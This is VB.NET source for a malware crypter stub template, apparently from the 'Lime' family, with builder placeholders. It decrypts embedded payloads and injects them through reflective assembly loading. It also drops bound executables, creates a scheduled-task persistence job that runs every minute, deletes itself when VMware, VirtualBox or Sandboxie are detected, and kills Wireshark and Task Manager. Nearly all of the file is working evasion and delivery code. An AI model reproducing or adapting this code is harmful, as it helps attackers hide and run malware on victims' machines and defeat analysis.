Imports System, Microsoft.VisualBasic
Imports Microsoft.Win32
Imports System.Windows
Imports System.Windows.Forms
Imports System.Reflection
Imports System.Text
Imports System.Security.Cryptography
Imports System.IO.Compression
Imports System.IO
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Collections
Imports System.Collections.Generic
Imports System.Data

'%ASSEMBLY%<Assembly: AssemblyTitle("%Title%")> 
'%ASSEMBLY%<Assembly: AssemblyDescription("%Description%")> 
'%ASSEMBLY%<Assembly: AssemblyCompany("%Company%")> 
'%ASSEMBLY%<Assembly: AssemblyProduct("%Product%")> 
'%ASSEMBLY%<Assembly: AssemblyCopyright("%Copyright%")> 
'%ASSEMBLY%<Assembly: AssemblyTrademark("%Trademark%")> 
'%ASSEMBLY%<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")> 

Public Class %Class1%


'%Bind%      Public Shared Sub %BindSub%
'%Bind%      Try
'%Bind%	     Dim %Asm% As Assembly = Assembly.GetExecutingAssembly()
'%Bind%	     Dim %Res% As New Resources.ResourceManager("%ResName%", %Asm%)    
'%Bind%	     
'%Bind%		 Dim %DecBind% = %AES_Decrypt%(%Res%.GetObject("%EncryptedBind%"),"%KEY%")
'%Bind%		 Dim %Binder% = %STRHEXFunc%(%DecBind%)
'%Bind%
'%BindOnce%  If IO.File.Exists(IO.Path.GetTempPath + "\LimeOnce") = False Then
'%BindOnce%  IO.File.WriteAllBytes(IO.Path.GetTempPath + "\" + "%BindName%",%Binder%)
'%BindOnce%	 IO.File.CreateText(IO.Path.GetTempPath + "\LimeOnce")
'%BindOnce%  Process.Start(IO.Path.GetTempPath + "\" + "%BindName%")
'%BindOnce%	 End If
'%BindDaily% IO.File.WriteAllBytes(IO.Path.GetTempPath + "\" + "%BindName%",%Binder%)
'%BindDaily% Process.Start(IO.Path.GetTempPath + "\" + "%BindName%")
'%Bind%		 Catch
'%Bind%		 End Try
'%Bind%	     End Sub

%JUNK3%
                 Public Shared Sub main()

'$Delay%		 Threading.Thread.Sleep(%Delay1% * 1000)


'%MUTEX%	     Dim %Mutex% As Threading.Mutex = Nothing
'%MUTEX%	     Dim %createdNew% As Boolean
'%MUTEX%         %Mutex% = New Threading.Mutex(True, %KEY%, %createdNew%)
'%MUTEX%         Try
'%MUTEX%         If Not %createdNew% Then End
'%MUTEX%         Finally
'%MUTEX%         If %createdNew% Then
'%MUTEX%         %Mutex%.ReleaseMutex()
'%MUTEX%         End If
'%MUTEX%         End Try

'%ANTIVM%	    Call %VM%
'%Drop%	        Call %DropSub%
'%Bind%         Call %BindSub%
	            Call %Run%
'%ANTIWIRE%	    Dim %T2% As New Threading.Thread(AddressOf %Wireshark%) : %T2%.Start()
'%ANTITASK%	    Dim %T3% As New Threading.Thread(AddressOf %Task%) : %T3%.Start()
                End Sub





'%Drop%   Public Shared Sub %DropSub%
'%Drop%   Try
'%Drop%   Dim %STUP% As String = Interaction.Environ("%PATH%") + "\" + "%EXE%"
'%Drop%   If Application.ExecutablePath <> %STUP% Then
'%Drop%   IO.File.Copy(Application.ExecutablePath, %STUP%, True)
'%Drop%   Shell("schtasks /create /f /sc minute /mo 1 /tn " + """'" & IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath) & "'""" + " /tr " + """'" & %STUP% & "'""", AppWinStyle.Hide, False, -1)
'%Drop%   Process.Start(%STUP%)
'%Drop%   End
'%Drop%   End If
'%Drop%   Catch
'%Drop%   End Try
'%Drop%   End sub



	     Public Shared Sub %Run%
		 Try
	     Dim %Asm% As Assembly = Assembly.GetExecutingAssembly()
	     Dim %Res% As New Resources.ResourceManager("%ResName%", %Asm%)    
	     
		 Dim %DecAdd% = %AES_Decrypt%(%Res%.GetObject("%EncyptedPayload%"),"%KEY%")
	     Dim %DecDLL% = %AES_Decrypt%(%Res%.GetObject("%EncryptedDLL%"),"%KEY%")
	    
		 Dim %STRHEX% = Convert.FromBase64String(%DecAdd%)
	     Dim %DLL% = Convert.FromBase64String(%DecDLL%)

        

         Dim %J% As Assembly = Assembly.Load(%DLL%)
         Dim %N% As Type = %J%.GetType("ClassLibrary2.Class1")
         Dim %V% As MethodInfo = %N%.GetMethod("Run", BindingFlags.Public Or BindingFlags.Static)
         %V%.Invoke(Nothing, New Object() {%Inject%, Nothing, %STRHEX%, True})
		 Catch
		 End Try
	     End Sub


		 %JUNK1%


	    Public Shared Function %AES_Decrypt%(ByVal %AESinput% As String, ByVal %AESpass% As String) As String
        Dim %AES% As New System.Security.Cryptography.RijndaelManaged
        Dim %Hash_AES% As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
        Dim %hash%(31) As Byte
        Dim %temp% As Byte() = %Hash_AES%.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(%AESpass%))
        Array.Copy(%temp%, 0, %hash%, 0, 16)
        Array.Copy(%temp%, 0, %hash%, 15, 16)
        %AES%.Key = %hash%
        %AES%.Mode = Security.Cryptography.CipherMode.ECB
        Dim %DESDecrypter% As System.Security.Cryptography.ICryptoTransform = %AES%.CreateDecryptor
        Dim %Buffer% As Byte() = Convert.FromBase64String(%AESinput%)
        decrypted = System.Text.ASCIIEncoding.ASCII.GetString(%DESDecrypter%.TransformFinalBlock(%Buffer%, 0, %Buffer%.Length))
        Return decrypted
        Catch ex As Exception
        End Try
        End Function

	    Public Shared Function %STRHEXFunc%(ByVal strInput As String) As Byte()
        Dim i As Integer = 0
        Dim x As Integer = 0
        Dim bytes As Byte() = New Byte((strInput.Length) / 2 - 1) {}

        While strInput.Length > i + 1
        Dim lngDecimal As Long = Convert.ToInt32(strInput.Substring(i, 2), 16)
        bytes(x) = Convert.ToByte(lngDecimal)
        i = i + 2
        x += 1
        End While
        Return bytes
        End Function


'%ANTIWIRE%	Public Shared Sub %Wireshark%()
'%ANTIWIRE%			Try
'%ANTIWIRE%	        Dim %iProcess% As Process() = Process.GetProcesses()
'%ANTIWIRE%			While True 
'%ANTIWIRE%       For Each %pr% As Process In %iProcess%
'%ANTIWIRE%           If %pr%.MainWindowTitle.ToLower.Contains(%AES_Decrypt%("%WiresharkString%", "%KEY%")) OrElse %pr%.ProcessName.ToLower.Contains(%AES_Decrypt%("%WiresharkString%", "%KEY%")) Then
'%ANTIWIRE%               %pr%.Kill()
'%ANTIWIRE%           End If
'%ANTIWIRE%       Next
'%ANTIWIRE%        Threading.Thread.sleep(1000)
'%ANTIWIRE%		End While
'%ANTIWIRE%			Catch
'%ANTIWIRE%			End Try
'%ANTIWIRE%	End Sub

'%ANTITASK%		Public Shared Sub %Task%()
'%ANTITASK%		Try
'%ANTITASK%		While True
'%ANTITASK%	        Dim %iProcess% As Process() = Process.GetProcesses()
'%ANTITASK%        For Each %pr% As Process In %iProcess%
'%ANTITASK%            If %pr%.MainWindowTitle.ToLower.Contains(%AES_Decrypt%("%TaskString%", "%KEY%")) OrElse %pr%.ProcessName.ToLower.Contains(%AES_Decrypt%("%TaskString%", "%KEY%")) Then
'%ANTITASK%                %pr%.Kill()
'%ANTITASK%            End If
'%ANTITASK%        Next
'%ANTITASK%        Threading.Thread.sleep(1000)
'%ANTITASK%		End While
'%ANTITASK%		Catch
'%ANTITASK%		End Try
'%ANTITASK%	End Sub

%JUNK2%

'%ANTIVM%	Public Shared Sub %VM%()
'%ANTIVM%           Try
'%ANTIVM%                If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
'%ANTIVM%
'%ANTIVM%                Dim %Info% As ProcessStartInfo = New ProcessStartInfo()
'%ANTIVM%                %Info%.Arguments = %AES_Decrypt%("%DEL%", "%KEY%") + """" + Application.ExecutablePath + """"
'%ANTIVM%                %Info%.WindowStyle = ProcessWindowStyle.Hidden
'%ANTIVM%                %Info%.CreateNoWindow = True
'%ANTIVM%                %Info%.FileName = "cmd.exe"
'%ANTIVM%                Process.Start(%Info%)
'%ANTIVM%                     End
'%ANTIVM%
'%ANTIVM%               ElseIf My.Computer.Info.OSFullName.ToString.ToLower.Contains("XP".ToLower) Then
'%ANTIVM%                Dim %Info% As ProcessStartInfo = New ProcessStartInfo()
'%ANTIVM%                %Info%.Arguments = %AES_Decrypt%("%DEL%", "%KEY%") + """" + Application.ExecutablePath + """"
'%ANTIVM%                %Info%.WindowStyle = ProcessWindowStyle.Hidden
'%ANTIVM%                %Info%.CreateNoWindow = True
'%ANTIVM%                %Info%.FileName = "cmd.exe"
'%ANTIVM%                Process.Start(%Info%)
'%ANTIVM%                     End
'%ANTIVM%
'%ANTIVM%                ElseIf Diagnostics.Process.GetProcessesByName("SbieSvc").Length >= 1 Then
'%ANTIVM%                Dim %Info% As ProcessStartInfo = New ProcessStartInfo()
'%ANTIVM%                %Info%.Arguments = %AES_Decrypt%("%DEL%", "%KEY%") + """" + Application.ExecutablePath + """"
'%ANTIVM%                %Info%.WindowStyle = ProcessWindowStyle.Hidden
'%ANTIVM%                %Info%.CreateNoWindow = True
'%ANTIVM%                %Info%.FileName = "cmd.exe"
'%ANTIVM%                Process.Start(%Info%)
'%ANTIVM%                     End
'%ANTIVM%
'%ANTIVM%                ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
'%ANTIVM%                Dim %Info% As ProcessStartInfo = New ProcessStartInfo()
'%ANTIVM%                %Info%.Arguments = %AES_Decrypt%("%DEL%", "%KEY%") + """" + Application.ExecutablePath + """"
'%ANTIVM%                %Info%.WindowStyle = ProcessWindowStyle.Hidden
'%ANTIVM%                %Info%.CreateNoWindow = True
'%ANTIVM%                %Info%.FileName = "cmd.exe"
'%ANTIVM%                Process.Start(%Info%)
'%ANTIVM%                     End
'%ANTIVM%
'%ANTIVM%                End If
'%ANTIVM%            Catch ex As Exception
'%ANTIVM%            End Try
'%ANTIVM%        End Sub

	End Class